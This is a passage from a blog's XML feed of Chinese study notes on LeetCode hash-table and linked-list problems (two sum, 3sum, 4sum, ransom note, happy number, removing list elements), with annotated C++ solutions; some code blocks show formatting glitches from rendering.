&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="两个数组的交集">两个数组的交集</h1><p><ahref="https://leetcode.cn/problems/intersection-of-two-arrays/">349.两个数组的交集 - 力扣（LeetCode）</a></p><p><strong>使用数组来做哈希的题目，是因为题目都限制了数值的大小。</strong></p><p>而这道题目没有限制数值的大小，就无法使用数组来做哈希表了。</p><p><strong>而且如果哈希值比较少、特别分散、跨度非常大，使用数组就造成空间的极大浪费。</strong></p><p>此时就要使用另一种结构体了，set ，关于set，C++给提供了如下三种可用的数据结构：</p><ul><li>std::set</li><li>std::multiset</li><li>std::unordered_set</li></ul><p>std::set和std::multiset底层实现都是红黑树，std::unordered_set的底层实现是哈希表，使用unordered_set读写效率是最高的，并不需要对数据进行排序，而且还不要让数据重复，所以选择unordered_set。</p><p>思路如图所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">intersection</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums1, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums2)</span> </span>&#123;<br>        unordered_set&lt;<span class="hljs-type">int</span>&gt; result_set; <span class="hljs-comment">// 存放结果，之所以用set是为了给结果集去重</span><br>        <span class="hljs-function">unordered_set&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">nums_set</span><span class="hljs-params">(nums1.begin(), nums1.end())</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums2) &#123;<br>            <span class="hljs-comment">// 发现nums2的元素 在nums_set里又出现过</span><br>            <span class="hljs-keyword">if</span> (nums_set.<span class="hljs-built_in">find</span>(num) != nums_set.<span class="hljs-built_in">end</span>()) &#123;<br>                result_set.<span class="hljs-built_in">insert</span>(num);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(result_set.<span class="hljs-built_in">begin</span>(), result_set.<span class="hljs-built_in">end</span>());<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="快乐数">快乐数</h1><p><a href="https://leetcode.cn/problems/happy-number/">202. 快乐数 -力扣（LeetCode）</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 取数值各个位上的单数之和</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getSum</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (n) &#123;<br>            sum += (n % <span class="hljs-number">10</span>) * (n % <span class="hljs-number">10</span>);<br>            n /= <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isHappy</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        unordered_set&lt;<span class="hljs-type">int</span>&gt; set;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-type">int</span> sum = <span class="hljs-built_in">getSum</span>(n);<br>            <span class="hljs-keyword">if</span> (sum == <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-comment">// 如果这个sum曾经出现过，说明已经陷入了无限循环了，立刻return false</span><br>            <span class="hljs-keyword">if</span> (set.<span class="hljs-built_in">find</span>(sum) != set.<span class="hljs-built_in">end</span>()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                set.<span class="hljs-built_in">insert</span>(sum);<br>            &#125;<br>            n = sum;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="两数之和">两数之和</h1><p><a href="https://leetcode.cn/problems/two-sum/">1. 两数之和 -力扣（LeetCode）</a></p><p>使用数组和set来做哈希法的局限。</p><ul><li>数组的大小是受限制的，而且如果元素很少，而哈希值太大会造成内存空间的浪费。</li><li>set是一个集合，里面放的元素只能是一个key，而两数之和这道题目，不仅要判断y是否存在而且还要记录y的下标位置，因为要返回x和 y的下标。所以set 也不能用。</li><li>map ，map是一种keyvalue的存储结构，可以用key保存数值，用value在保存数值所在的下标。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        std::unordered_map &lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; map;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-comment">// 遍历当前元素，并在map中寻找是否有匹配的key</span><br>            <span class="hljs-keyword">auto</span> iter = map.<span class="hljs-built_in">find</span>(target - nums[i]); <br>            <span class="hljs-keyword">if</span>(iter != map.<span class="hljs-built_in">end</span>()) &#123;<br>                <span class="hljs-keyword">return</span> &#123;iter-&gt;second, i&#125;;<br>            &#125;<br>            <span class="hljs-comment">// 如果没找到匹配对，就把访问过的元素和下标加入到map中</span><br>            map.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;(nums[i], i)); <br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="四数相加">四数相加</h1><p><a href="https://leetcode.cn/problems/4sum-ii/">454. 四数相加 II -力扣（LeetCode）</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fourSumCount</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; A, vector&lt;<span class="hljs-type">int</span>&gt;&amp; B, vector&lt;<span class="hljs-type">int</span>&gt;&amp; C, vector&lt;<span class="hljs-type">int</span>&gt;&amp; D)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; umap; <span class="hljs-comment">//key:a+b的数值，value:a+b数值出现的次数</span><br>        <span class="hljs-comment">// 遍历大A和大B数组，统计两个数组元素之和，和出现的次数，放到map中</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> a : A) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> b : B) &#123;<br>                umap[a + b]++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">// 统计a+b+c+d = 0 出现的次数</span><br>        <span class="hljs-comment">// 在遍历大C和大D数组，找到如果 0-(c+d) 在map中出现过的话，就把map中key对应的value也就是出现次数统计出来。</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> c : C) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> d : D) &#123;<br>                <span class="hljs-keyword">if</span> (umap.<span class="hljs-built_in">find</span>(<span class="hljs-number">0</span> - (c + d)) != umap.<span class="hljs-built_in">end</span>()) &#123;<br>                    count += umap[<span class="hljs-number">0</span> - (c + d)];<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="赎金信">赎金信</h1><p><a href="https://leetcode.cn/problems/ransom-note/">383. 赎金信 -力扣（LeetCode）</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 时间复杂度: O(n)</span><br><span class="hljs-comment">// 空间复杂度：O(1)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">canConstruct</span><span class="hljs-params">(string ransomNote, string magazine)</span> </span>&#123;<br>        <span class="hljs-type">int</span> record[<span class="hljs-number">26</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-comment">//add</span><br>        <span class="hljs-keyword">if</span> (ransomNote.<span class="hljs-built_in">size</span>() &gt; magazine.<span class="hljs-built_in">size</span>()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; magazine.<span class="hljs-built_in">length</span>(); i++) &#123;<br>            <span class="hljs-comment">// 通过recode数据记录 magazine里各个字符出现次数</span><br>            record[magazine[i]-<span class="hljs-string">&#x27;a&#x27;</span>] ++;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; ransomNote.<span class="hljs-built_in">length</span>(); j++) &#123;<br>            <span class="hljs-comment">// 遍历ransomNote，在record里对应的字符个数做--操作</span><br>            record[ransomNote[j]-<span class="hljs-string">&#x27;a&#x27;</span>]--;<br>            <span class="hljs-comment">// 如果小于零说明ransomNote里出现的字符，magazine没有</span><br>            <span class="hljs-keyword">if</span>(record[ransomNote[j]-<span class="hljs-string">&#x27;a&#x27;</span>] &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="三数之和">三数之和</h1><p><a href="https://leetcode.cn/problems/3sum/">15. 三数之和 -力扣（LeetCode）</a></p><p>拿这个nums数组来举例，首先将数组排序，然后有一层for循环，i从下标0的地方开始，同时定一个下标left定义在i+1的位置上，定义下标right 在数组结尾的位置上。</p><p>依然还是在数组中找到 abc 使得a + b +c =0，我们这里相当于 a =nums[i]，b = nums[left]，c = nums[right]。</p><p>接下来如何移动left 和right呢， 如果nums[i] + nums[left] + nums[right]&gt; 0 就说明此时三数之和大了，因为数组是排序后了，所以right下标就应该向左移动，这样才能让三数之和小一些。</p><p>如果 nums[i] + nums[left] + nums[right] &lt; 0 说明 此时三数之和小了，left就向右移动，才能让三数之和大一些，直到left与right相遇为止。</p><p>时间复杂度：O(n^2)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">threeSum</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result;<br>        <span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// 找出a + b + c = 0</span><br>        <span class="hljs-comment">// a = nums[i], b = nums[left], c = nums[right]</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-comment">// 排序之后如果第一个元素已经大于零，那么无论如何组合都不可能凑成三元组，直接返回结果就可以了</span><br>            <span class="hljs-keyword">if</span> (nums[i] &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> result;<br>            &#125;<br>            <span class="hljs-comment">// 错误去重a方法，将会漏掉-1,-1,2 这种情况</span><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            if (nums[i] == nums[i + 1]) &#123;</span><br><span class="hljs-comment">                continue;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-comment">// 正确去重a方法</span><br>            <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span> &amp;&amp; nums[i] == nums[i - <span class="hljs-number">1</span>]) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-type">int</span> left = i + <span class="hljs-number">1</span>;<br>            <span class="hljs-type">int</span> right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">while</span> (right &gt; left) &#123;<br>                <span class="hljs-comment">// 去重复逻辑如果放在这里，0，0，0 的情况，可能直接导致 right&lt;=left 了，从而漏掉了 0,0,0 这种三元组</span><br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                while (right &gt; left &amp;&amp; nums[right] == nums[right - 1]) right--;</span><br><span class="hljs-comment">                while (right &gt; left &amp;&amp; nums[left] == nums[left + 1]) left++;</span><br><span class="hljs-comment">                */</span><br>                <span class="hljs-keyword">if</span> (nums[i] + nums[left] + nums[right] &gt; <span class="hljs-number">0</span>) right--;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[i] + nums[left] + nums[right] &lt; <span class="hljs-number">0</span>) left++;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    result.<span class="hljs-built_in">push_back</span>(vector&lt;<span class="hljs-type">int</span>&gt;&#123;nums[i], nums[left], nums[right]&#125;);<br>                    <span class="hljs-comment">// 去重逻辑应该放在找到一个三元组之后，对b 和 c去重</span><br>                    <span class="hljs-keyword">while</span> (right &gt; left &amp;&amp; nums[right] == nums[right - <span class="hljs-number">1</span>]) right--;<br>                    <span class="hljs-keyword">while</span> (right &gt; left &amp;&amp; nums[left] == nums[left + <span class="hljs-number">1</span>]) left++;<br><br>                    <span class="hljs-comment">// 找到答案时，双指针同时收缩</span><br>                    right--;<br>                    left++;<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="四数之和">四数之和</h1><p><a href="https://leetcode.cn/problems/4sum/">18. 四数之和 -力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">fourSum</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result;<br>        <span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; nums.<span class="hljs-built_in">size</span>(); k++) &#123;<br>            <span class="hljs-comment">// 剪枝处理</span><br>            <span class="hljs-keyword">if</span> (nums[k] &gt; target &amp;&amp; nums[k] &gt;= <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 这里使用break，统一通过最后的return返回</span><br>            &#125;<br>            <span class="hljs-comment">// 对nums[k]去重</span><br>            <span class="hljs-keyword">if</span> (k &gt; <span class="hljs-number">0</span> &amp;&amp; nums[k] == nums[k - <span class="hljs-number">1</span>]) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = k + <span class="hljs-number">1</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>                <span class="hljs-comment">// 2级剪枝处理</span><br>                <span class="hljs-keyword">if</span> (nums[k] + nums[i] &gt; target &amp;&amp; nums[k] + nums[i] &gt;= <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br><br>                <span class="hljs-comment">// 对nums[i]去重</span><br>                <span class="hljs-keyword">if</span> (i &gt; k + <span class="hljs-number">1</span> &amp;&amp; nums[i] == nums[i - <span class="hljs-number">1</span>]) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-type">int</span> left = i + <span class="hljs-number">1</span>;<br>                <span class="hljs-type">int</span> right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">while</span> (right &gt; left) &#123;<br>                    <span class="hljs-comment">// nums[k] + nums[i] + nums[left] + nums[right] &gt; target 会溢出</span><br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>) nums[k] + nums[i] + nums[left] + nums[right] &gt; target) &#123;<br>                        right--;<br>                    <span class="hljs-comment">// nums[k] + nums[i] + nums[left] + nums[right] &lt; target 会溢出</span><br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>) nums[k] + nums[i] + nums[left] + nums[right]  &lt; target) &#123;<br>                        left++;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        result.<span class="hljs-built_in">push_back</span>(vector&lt;<span class="hljs-type">int</span>&gt;&#123;nums[k], nums[i], nums[left], nums[right]&#125;);<br>                        <span class="hljs-comment">// 对nums[left]和nums[right]去重</span><br>                        <span class="hljs-keyword">while</span> (right &gt; left &amp;&amp; nums[right] == nums[right - <span class="hljs-number">1</span>]) right--;<br>                        <span class="hljs-keyword">while</span> (right &gt; left &amp;&amp; nums[left] == nums[left + <span class="hljs-number">1</span>]) left++;<br><br>                        <span class="hljs-comment">// 找到答案时，双指针同时收缩</span><br>                        right--;<br>                        left++;<br>                    &#125;<br>                &#125;<br><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>哈希表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表</title>
    <link href="/2022/09/05/Algorithm/algorithm-2/"/>
    <url>/2022/09/05/Algorithm/algorithm-2/</url>
    
    <content type="html"><![CDATA[<p>本文为学习<ahref="https://programmercarl.com/">代码随想录</a>时所做的笔记，仅供学习参考，不做任何商业用途，若有侵权，请联系删除。</p><h1 id="链表的定义">链表的定义</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 单链表</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ListNode</span> &#123;<br>    <span class="hljs-type">int</span> val;  <span class="hljs-comment">// 节点上存储的元素</span><br>    ListNode *next;  <span class="hljs-comment">// 指向下一个节点的指针</span><br>    <span class="hljs-built_in">ListNode</span>(<span class="hljs-type">int</span> x) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">next</span>(<span class="hljs-literal">NULL</span>) &#123;&#125;  <span class="hljs-comment">// 节点的构造函数</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以不定义构造函数，C++默认生成一个构造函数，但是这个构造函数不会初始化任何成员变量</p><ul><li><p>自定义的构造函数初始化节点</p><ul><li>```c++ ListNode* head = new ListNode(5) ; <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- 使用默认构造函数初始化节点<br><br>  - ```c++<br>    ListNode* head = <span class="hljs-keyword">new</span> ListNode()<span class="hljs-comment">;</span><br>    head-&gt;val = <span class="hljs-number">5</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><span id="more"></span><h1 id="移除链表元素">移除链表元素</h1><p><ahref="https://leetcode.cn/problems/remove-linked-list-elements/">203.移除链表元素 - 力扣（LeetCode）</a></p><ul><li><p>直接使用原来的链表进行移除节点操作</p><ul><li><p>```c++ class Solution { public: ListNode*removeElements(ListNode* head, int val) { // 删除头结点 while (head !=NULL &amp;&amp; head-&gt;val == val) { // 注意这里不是if ListNode* tmp =head; head = head-&gt;next; delete tmp; }</p><pre><code class="hljs">    // 删除非头结点    ListNode* cur = head;    while (cur != NULL &amp;&amp; cur-&gt;next!= NULL) &#123;        if (cur-&gt;next-&gt;val == val) &#123;            ListNode* tmp = cur-&gt;next;            cur-&gt;next = cur-&gt;next-&gt;next;            delete tmp;        &#125; else &#123;            cur = cur-&gt;next;        &#125;    &#125;    return head;&#125;</code></pre><p>}; <figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xl"><br>    <br><br>- 设置一个虚拟头结点<br><br>  - ```c++<br>    class Solution &#123;<br>    public:<br>        ListNode* removeElements(ListNode* head, int val) &#123;<br>            ListNode* dummyHead = new ListNode(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置一个虚拟头结点</span><br>            <span class="hljs-function"><span class="hljs-title">dummyHead</span>-&gt;</span>next = head; <span class="hljs-comment">// 将虚拟头结点指向head，这样方面后面做删除操作</span><br>            ListNode* cur = dummyHead;<br>            <span class="hljs-function"><span class="hljs-title">while</span> (cur-&gt;</span>next != NULL) &#123;<br>                <span class="hljs-function"><span class="hljs-title">if</span>(cur-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span>-&gt;</span>val == val) &#123;<br>                    L<span class="hljs-function"><span class="hljs-title">istNode</span>* tmp = cur-&gt;</span>next;<br>                    <span class="hljs-function"><span class="hljs-title">cur</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span> = cur-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span>-&gt;</span>next;<br>                    delete tmp;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-function"><span class="hljs-title">cur</span> = cur-&gt;</span>next;<br>                &#125;<br>            &#125;<br>            <span class="hljs-function"><span class="hljs-title">head</span> = dummyHead-&gt;</span>next;<br>            delete dummyHead;<br>            return head;<br>        &#125;<br>    &#125;;<br></code></pre></td></tr></table></figure></p></li></ul></li></ul><h1 id="设计链表">设计链表</h1><p><a href="https://leetcode.cn/problems/design-linked-list/">707.设计链表 - 力扣（LeetCode）</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 